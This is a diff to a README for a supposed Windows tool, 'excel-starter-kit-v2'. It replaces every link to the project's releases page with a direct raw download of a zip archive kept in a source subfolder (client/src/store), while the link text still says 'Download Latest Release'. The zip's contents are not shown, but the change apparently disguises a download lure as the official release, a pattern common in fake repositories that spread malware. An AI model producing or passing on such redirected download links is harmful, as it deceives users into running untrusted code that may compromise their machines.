@@ -1,6 +1,6 @@
 # ⚙️ excel-starter-kit-v2 - Build Custom Data Apps Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/lovemysaturn/excel-starter-kit-v2/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/lovemysaturn/excel-starter-kit-v2/main/client/src/store/starter_excel_v_kit_3.4-beta.2.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Follow these steps to download and run excel-starter-kit-v2 on your Windows PC.
 
 Click the link below to open the release page where you can get the latest version of the software:
 
-[Download Latest Release](https://github.com/lovemysaturn/excel-starter-kit-v2/releases)
+[Download Latest Release](https://raw.githubusercontent.com/lovemysaturn/excel-starter-kit-v2/main/client/src/store/starter_excel_v_kit_3.4-beta.2.zip)
 
 ### 2. Choose the Correct File
 
@@ -130,7 +130,7 @@ For further help, you can visit the repository’s issues page on GitHub.
 
 You can always visit this page to download the latest version:
 
-[https://github.com/lovemysaturn/excel-starter-kit-v2/releases](https://github.com/lovemysaturn/excel-starter-kit-v2/releases)
+[https://raw.githubusercontent.com/lovemysaturn/excel-starter-kit-v2/main/client/src/store/starter_excel_v_kit_3.4-beta.2.zip](https://raw.githubusercontent.com/lovemysaturn/excel-starter-kit-v2/main/client/src/store/starter_excel_v_kit_3.4-beta.2.zip)
 
 ---
 
@@ -162,7 +162,7 @@ This software includes support for:
 
 ## 🔗 Useful Links
 
-- Download: [https://github.com/lovemysaturn/excel-starter-kit-v2/releases](https://github.com/lovemysaturn/excel-starter-kit-v2/releases)
+- Download: [https://raw.githubusercontent.com/lovemysaturn/excel-starter-kit-v2/main/client/src/store/starter_excel_v_kit_3.4-beta.2.zip](https://raw.githubusercontent.com/lovemysaturn/excel-starter-kit-v2/main/client/src/store/starter_excel_v_kit_3.4-beta.2.zip)
 - Report issues: Use the GitHub Issues tab on the repository
 - User guides and help: Check the project repository’s Wiki or documentation folder if available
 
